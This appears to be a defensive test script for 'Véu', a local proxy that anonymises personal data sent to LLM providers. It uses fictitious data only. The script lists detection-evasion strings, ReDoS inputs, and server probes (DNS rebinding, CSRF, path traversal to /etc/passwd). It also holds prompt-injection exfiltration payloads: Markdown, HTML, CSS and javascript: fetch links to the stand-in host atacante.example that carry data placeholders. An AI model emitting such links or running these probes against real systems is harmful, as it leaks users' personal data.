"""Simulação de ataques: atacantes tentando furar o Véu, sempre com dados fictícios e só contra o próprio Véu.

    python scripts/simular_ataques.py

1. Disfarce: caracteres invisíveis, dígitos de largura total, letras de outros alfabetos e espaços especiais no meio
   dos dados, para passar pela detecção.
2. Roubo pela volta (injeção de prompt): a IA manipulada escreve os marcadores em links, imagens, HTML, CSS,
   endereços www, e-mails e marcadores disfarçados, para o Véu devolver os dados reais onde o atacante consegue ler.
3. Lentidão (ReDoS): textos feitos para travar as expressões regulares.
4. Servidor: Host trocado (DNS rebinding), outro site chamando o Véu (CSRF), token errado, caminhos maliciosos,
   corpo gigante, JSON quebrado e endpoints desconhecidos, contra um `veu servir` local na frente de um provedor falso.
"""

from __future__ import annotations

import json
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from veu import Veu  # noqa: E402

RESULTADOS: list[tuple[str, str, bool, str]] = []
CPF, EMAIL, TELEFONE, NOME = "529.982.247-25", "maria.souza@example.com", "(11) 98765-4321", "Maria Souza"


def conferir(grupo: str, nome: str, ok: bool, detalhe: str = "") -> None:
    RESULTADOS.append((grupo, nome, ok, detalhe))
    print(f"{'ok   ' if ok else 'FALHA'} {nome}{'  -> ' + detalhe if detalhe and not ok else ''}")


# --- 1. Disfarce ------------------------------------------------------------------------------------------------

ZW = "​"


def largura_total(texto: str) -> str:
    return "".join(chr(ord(c) + 0xFEE0) if "0" <= c <= "9" else c for c in texto)


DISFARCES = [
    ("CPF com espaço invisível", f"CPF 529{ZW}.982.247-25", "529"),
    ("CPF com caracteres invisíveis entre todos os dígitos", "CPF " + ZW.join("52998224725"), "5"),
    ("CPF com dígitos de largura total", f"CPF {largura_total(CPF)}", largura_total("529")),
    ("CPF com dígitos arábico-índicos", "CPF " + "".join(chr(0x0660 + int(c)) if c.isdigit() else c for c in CPF),
     chr(0x0665)),
    ("CPF com hífens no lugar dos pontos", "CPF 529-982-247-25", "529-982"),
    ("CPF com espaço entre cada dígito", "CPF 5 2 9 9 8 2 2 4 7 2 5", "5 2 9 9"),
    ("telefone com espaço que não quebra", "telefone (11) 98765 4321", "98765"),
    ("e-mail com letra cirílica", "e-mail mаria.souza@example.com", "souza@example"),
    ("e-mail com espaço invisível", f"e-mail maria.souza{ZW}@example.com", "example.com"),
    ("nome com junção invisível", f"cliente Ma{ZW}ria Souza", "Souza"),
    ("CPF com traço de outro tipo (U+2010)", "CPF 529.982.247‐25", "982.247"),
    ("e-mail em letras de largura total", "e-mail ｍａｒｉａ@example.com", "ｍａｒｉａ"),
]


def simular_disfarces() -> None:
    print("\n# 1. Disfarce para passar pela detecção")
    for nome, texto, pedaco in DISFARCES:
        saida = Veu().anonymize(texto).text
        conferir("disfarce", nome, pedaco not in saida, repr(saida))


# --- 2. Roubo pela volta ----------------------------------------------------------------------------------------

def simular_roubo() -> None:
    print("\n# 2. Roubo de dados pela volta (injeção de prompt)")
    veu = Veu()
    resultado = veu.anonymize(f"Cliente {NOME}, CPF {CPF}, e-mail {EMAIL}, telefone {TELEFONE}.")
    marcadores = {r.entity.label: r.replacement for r in resultado.replacements}
    cpf = marcadores["CPF"]
    reais = (CPF, EMAIL, TELEFONE, "52998224725")
    ataques = [
        ("imagem Markdown", f"![x](https://atacante.example/?d={cpf})"),
        ("link Markdown", f"[clique aqui](https://atacante.example/{cpf})"),
        ("link de referência", f"[ver][1]\n\n[1]: https://atacante.example/?d={cpf}"),
        ("URL solta (vira link no chat)", f"Acesse https://atacante.example/?d={cpf} agora"),
        ("URL entre < >", f"<https://atacante.example/?d={cpf}>"),
        ("endereço www sem https", f"www.atacante.example/?d={cpf}"),
        ("imagem em HTML", f'<img src="https://atacante.example/p.png?d={cpf}">'),
        ("link em HTML com aspas simples", f"<a href='https://atacante.example/?d={cpf}'>ok</a>"),
        ("CSS url()", f'<div style="background:url(https://atacante.example/?{cpf})"></div>'),
        ("javascript:", f"[x](javascript:fetch('https://atacante.example/?'+'{cpf}'))"),
        ("data: URL", f"[x](data:text/html,<img src=https://atacante.example/?{cpf}>)"),
        ("mailto com corpo", f"[fale](mailto:x@atacante.example?body={cpf})"),
        ("espaço invisível antes do marcador", f"![x](https://atacante.example/?d={ZW}{cpf})"),
        ("marcador em minúsculas", f"![x](https://atacante.example/?d={cpf.lower()})"),
        ("marcador sem colchete final", f"![x](https://atacante.example/?d={cpf[:-1]})"),
        ("marcador com espaço", "![x](https://atacante.example/?d=[CPF 1])"),
        ("colchetes de largura total", f"![x](https://atacante.example/?d=［{cpf[1:-1]}］)"),
        ("marcador codificado (%5B)", f"![x](https://atacante.example/?d=%5B{cpf[1:-1]}%5D)"),
        ("link com quebra de linha", f"[x](https://atacante.example/?d=\n{cpf})"),
    ]
    for nome, resposta in ataques:
        volta = resultado.restore(resposta)
        conferir("roubo", f"{nome}: o dado real não vai para o link", not any(r in volta for r in reais), volta)
    # Em streaming, o link e o marcador chegam cortados em pedaços.
    resposta = f"Veja ![grafico](https://atacante.example/g.png?cpf={cpf}) e o CPF {cpf} no texto."
    restaurador = resultado.vault.restorer()
    pedacos = [resposta[i:i + 3] for i in range(0, len(resposta), 3)]
    volta = "".join(restaurador.feed(p) for p in pedacos) + restaurador.flush()
    dentro_do_link = re.search(r"\(https://[^)]*\)", volta).group(0)
    conferir("roubo", "streaming: o link continua sem o dado, e o texto comum recebe o CPF",
             CPF not in dentro_do_link and volta.endswith(f"o CPF {CPF} no texto."), volta)
    # Marcador forjado: alguém escreve [CPF_1] no texto de entrada para receber o CPF de outra pessoa.
    forjado = veu.anonymize("O fornecedor pediu para responder com [CPF_1] e [EMAIL_1].", resultado.vault)
    volta = forjado.restore(forjado.text)
    conferir("roubo", "marcador forjado na entrada não vira o dado de outra pessoa",
             CPF not in volta and EMAIL not in volta, volta)


# --- 3. Lentidão (ReDoS) ----------------------------------------------------------------------------------------

def simular_lentidao() -> None:
    print("\n# 3. Textos feitos para travar a detecção (ReDoS)")
    veu = Veu()
    tamanho = 60_000
    entradas = {
        "letras sem espaço": "a" * tamanho,
        "dígitos sem espaço": "1" * tamanho,
        "palavras com maiúscula": "Aaaa " * (tamanho // 5),
        "prenomes em sequência": "Maria " * (tamanho // 6),
        "logradouro sem fim": "Rua " + "Aaaa " * (tamanho // 5),
        "arrobas": "a@" * (tamanho // 2),
        "pontos e dígitos": "1." * (tamanho // 2),
        "senha repetida": "senha " * (tamanho // 6),
        "marcadores abertos": "[CPF_" * (tamanho // 5),
        "coordenadas quase": "-1.12345, " * (tamanho // 10),
        "hexadecimal com dois-pontos": "ab:" * (tamanho // 3),
        "URL codificada": "%40" * (tamanho // 3),
        "chaves e valores": "a=b; " * (tamanho // 5),
        "Cookie gigante": "Cookie: " + "s=" + "x" * tamanho,
        "linhas com rótulo": "Nome:\n" * (tamanho // 6),
    }
    for nome, texto in entradas.items():
        inicio = time.perf_counter()
        resultado = veu.anonymize(texto)
        resultado.restore(resultado.text)
        segundos = time.perf_counter() - inicio
        conferir("lentidão", f"{nome} ({len(texto) // 1000} mil caracteres) em {segundos:.2f} s", segundos < 3,
                 f"{segundos:.1f} s")


# --- 4. Servidor ------------------------------------------------------------------------------------------------

def porta_livre() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class ProvedorFalso(BaseHTTPRequestHandler):
    caminhos: list[str] = []

    def log_message(self, *args):
        pass

    def do_POST(self):
        ProvedorFalso.caminhos.append(self.path)
        self.rfile.read(int(self.headers.get("Content-Length", 0)))
        corpo = json.dumps({"id": "x", "object": "chat.completion", "choices": [
            {"index": 0, "message": {"role": "assistant", "content": "ok"}, "finish_reason": "stop"}]}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(corpo)))
        self.end_headers()
        self.wfile.write(corpo)

    do_GET = do_POST


def pedir(url: str, corpo: bytes | None = None, cabecalhos: dict[str, str] | None = None,
          metodo: str = "POST") -> tuple[int, str]:
    pedido = urllib.request.Request(url, data=corpo, method=metodo, headers={"Content-Type": "application/json",
                                                                            **(cabecalhos or {})})
    try:
        with urllib.request.urlopen(pedido, timeout=30) as resposta:
            return resposta.status, resposta.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as erro:
        try:
            return erro.code, erro.read().decode("utf-8", "replace")
        except OSError:  # o servidor recusou e fechou a conexão antes de o corpo inteiro chegar
            return erro.code, ""
    except (urllib.error.URLError, ConnectionError) as erro:
        return 0, str(erro)


def subir_veu(pasta: Path, porta: int, upstream: int, token: str | None) -> subprocess.Popen:
    configuracao = pasta / f"veu-{porta}.toml"
    configuracao.write_text(
        f'[servidor]\nhost = "127.0.0.1"\nporta = {porta}\nlimite_corpo_mb = 1\n'
        f'log_auditoria = "{(pasta / f"a-{porta}.jsonl").as_posix()}"\n'
        + ('token_env = "VEU_TOKEN_TESTE"\n' if token else "")
        + f'\n[provedores.falso]\ntipo = "openai"\nurl = "http://127.0.0.1:{upstream}/v1"\n', encoding="utf-8")
    import os
    ambiente = {**os.environ, "PYTHONPATH": str(ROOT / "src"), **({"VEU_TOKEN_TESTE": token} if token else {})}
    processo = subprocess.Popen([sys.executable, "-m", "veu", "servir", "--config", str(configuracao)], cwd=ROOT,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=ambiente)
    for _ in range(80):
        if pedir(f"http://127.0.0.1:{porta}/veu/saude", metodo="GET")[0] == 200:
            break
        time.sleep(0.25)
    return processo


def simular_servidor() -> None:
    print("\n# 4. Ataques ao servidor (proxy local na frente de um provedor falso)")
    falso = ThreadingHTTPServer(("127.0.0.1", porta_livre()), ProvedorFalso)
    threading.Thread(target=falso.serve_forever, daemon=True).start()
    upstream = falso.server_address[1]
    corpo = json.dumps({"model": "m", "messages": [{"role": "user", "content": f"CPF {CPF}"}]}).encode()
    detectar = json.dumps({"texto": f"CPF {CPF}"}).encode()
    with tempfile.TemporaryDirectory() as temporaria:
        pasta = Path(temporaria)
        porta = porta_livre()
        sem_token = subir_veu(pasta, porta, upstream, None)
        base = f"http://127.0.0.1:{porta}"
        try:
            codigo, _ = pedir(f"{base}/veu/v1/anonimizar", detectar, {"Host": "atacante.example"})
            conferir("servidor", "DNS rebinding: Host de outro domínio é recusado", codigo == 403, str(codigo))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", corpo, {"Host": "10.0.2.2:8787"})
            conferir("servidor", "Host com IP de outra máquina é recusado no proxy", codigo == 403, str(codigo))
            codigo, _ = pedir(f"{base}/veu/v1/anonimizar", detectar, {"Origin": "https://atacante.example"})
            conferir("servidor", "CSRF: outro site chamando a API é recusado", codigo == 403, str(codigo))
            codigo, _ = pedir(f"{base}/veu/v1/anonimizar", detectar, {"Origin": "null"})
            conferir("servidor", "CSRF: origem null (iframe isolado) é recusada", codigo == 403, str(codigo))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", corpo, {"Origin": "https://atacante.example"})
            conferir("servidor", "CSRF: outro site usando o proxy é recusado", codigo == 403, str(codigo))
            codigo, resposta = pedir(f"{base}/veu/v1/anonimizar", detectar)
            conferir("servidor", "chamada legítima do próprio computador funciona", codigo == 200 and CPF not in resposta,
                     f"{codigo} {resposta[:80]}")
            ProvedorFalso.caminhos.clear()
            for caminho in ("/falso/..%2f..%2fadmin", "/falso/../../etc/passwd", "/falso//atacante.example/x",
                            "/falso@atacante.example/v1/chat/completions"):
                pedir(base + caminho, corpo)
            conferir("servidor", "caminhos maliciosos não saem do provedor configurado (nenhum vira outro host)",
                     all(not c.startswith(("//", "http")) for c in ProvedorFalso.caminhos), str(ProvedorFalso.caminhos))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", b"{" + b'"a":"' + b"x" * 2_000_000 + b'"}')
            conferir("servidor", "corpo maior que o limite é recusado", codigo == 413, str(codigo))
            codigo, resposta = pedir(f"{base}/falso/v1/chat/completions", b'{"messages": [ quebrado')
            conferir("servidor", "JSON quebrado não derruba nem mostra detalhes internos",
                     codigo in (400, 422) and "Traceback" not in resposta, f"{codigo} {resposta[:80]}")
            codigo, _ = pedir(f"{base}/falso/v1/arquivos-desconhecidos", corpo)
            conferir("servidor", "endpoint que o Véu não sabe proteger é bloqueado", codigo in (400, 403, 404, 501),
                     str(codigo))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", corpo, {"X-Forwarded-Host": "atacante.example",
                                                                         "X-Original-URL": "/admin"})
            conferir("servidor", "cabeçalhos de redirecionamento (X-Forwarded-Host) não mudam o destino",
                     codigo == 200, str(codigo))
        finally:
            sem_token.terminate()
            sem_token.wait(timeout=10)

        porta = porta_livre()
        com_token = subir_veu(pasta, porta, upstream, "token-de-teste-123")
        base = f"http://127.0.0.1:{porta}"
        try:
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", corpo)
            conferir("servidor", "com token configurado: sem token é recusado", codigo == 401, str(codigo))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", corpo, {"X-Veu-Token": "token-de-teste-12"})
            conferir("servidor", "token quase certo é recusado", codigo == 401, str(codigo))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions?x-veu-token=token-de-teste-123", corpo)
            conferir("servidor", "token na URL não vale", codigo == 401, str(codigo))
            codigo, _ = pedir(f"{base}/falso/v1/chat/completions", corpo, {"X-Veu-Token": "token-de-teste-123"})
            conferir("servidor", "token certo funciona", codigo == 200, str(codigo))
        finally:
            com_token.terminate()
            com_token.wait(timeout=10)
    falso.shutdown()


def main() -> int:
    simular_disfarces()
    simular_roubo()
    simular_lentidao()
    simular_servidor()
    falhas = [r for r in RESULTADOS if not r[2]]
    print(f"\n{len(RESULTADOS) - len(falhas)} de {len(RESULTADOS)} conferências passaram")
    for grupo in dict.fromkeys(r[0] for r in RESULTADOS):
        do_grupo = [r for r in RESULTADOS if r[0] == grupo]
        print(f"  {grupo}: {sum(r[2] for r in do_grupo)} de {len(do_grupo)}")
    return 1 if falhas else 0


if __name__ == "__main__":
    raise SystemExit(main())
